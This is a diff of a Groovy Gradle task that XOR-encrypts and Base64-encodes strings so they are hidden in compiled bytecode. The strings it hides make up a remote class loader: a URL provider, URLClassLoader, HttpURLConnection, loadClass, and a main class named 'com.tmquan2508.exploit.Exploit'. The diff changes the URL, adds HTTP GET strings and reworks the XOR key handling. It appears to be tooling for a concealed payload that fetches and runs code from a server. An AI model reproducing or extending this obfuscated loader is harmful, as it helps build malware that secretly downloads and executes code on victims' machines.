@@ -30,20 +30,19 @@ abstract class AsmObfuscateStringsTask extends DefaultTask {
     abstract Property<String> getTargetClass()
 
     private static final Map<String, String> OBFUSCATION_MAP = [
-            "::S_URL_PROVIDER::"           : "http://localhost:3000/resource",
+            "::S_URL_PROVIDER::"           : "http://localhost:3000",
             "::S_JAVA_NET_URL::"           : "java.net.URL",
             "::S_JAVA_NET_URL_CLASS_LOADER::": "java.net.URLClassLoader",
             "::S_JAVA_LANG_CLASS_LOADER::" : "java.lang.ClassLoader",
             "::S_MAIN_CLASS::"             : "com.tmquan2508.exploit.Exploit",
             "::S_LOAD_CLASS_METHOD::"      : "loadClass",
             "::S_HTTP_CONN_CLASS::"        : "java.net.HttpURLConnection",
+            "::S_URL_CONN_CLASS::"         : "java.net.URLConnection",
             "::S_OPEN_CONN_METHOD::"       : "openConnection",
             "::S_SET_REQ_METHOD::"         : "setRequestMethod",
+            "::S_HTTP_GET_METHOD::"        : "GET",
             "::S_GET_INPUT_STREAM_METHOD::": "getInputStream",
-            "::S_DISCONNECT_METHOD::"      : "disconnect",
-            "::S_JAVA_UTIL_BASE64::"       : "java.util.Base64",
-            "::S_GET_DECODER_METHOD::"     : "getDecoder",
-            "::S_DECODE_METHOD::"          : "decode"
+            "::S_DISCONNECT_METHOD::"      : "disconnect"
     ]
 
     @TaskAction
@@ -144,9 +143,10 @@ abstract class AsmObfuscateStringsTask extends DefaultTask {
     static String encrypt(String plainText, String key) {
         try {
             byte[] plainBytes = plainText.bytes
+            byte[] keyBytes = key.bytes
             byte[] result = new byte[plainBytes.length]
             for (int i = 0; i < plainBytes.length; i++) {
-                result[i] = (byte) (plainBytes[i] ^ (int) key.charAt(i % key.length()))
+                result[i] = (byte) (plainBytes[i] ^ keyBytes[i % keyBytes.length])
             }
             return result.encodeBase64().toString()
         } catch (Exception ex) {
@@ -157,9 +157,10 @@ abstract class AsmObfuscateStringsTask extends DefaultTask {
     static String decrypt(String encryptedBase64, String key) {
         try {
             byte[] encryptedBytes = encryptedBase64.decodeBase64()
+            byte[] keyBytes = key.bytes
             byte[] result = new byte[encryptedBytes.length]
             for (int i = 0; i < encryptedBytes.length; i++) {
-                result[i] = (byte) (encryptedBytes[i] ^ (int) key.charAt(i % key.length()))
+                result[i] = (byte) (encryptedBytes[i] ^ keyBytes[i % keyBytes.length])
             }
             return new String(result)
         } catch (Exception ex) {
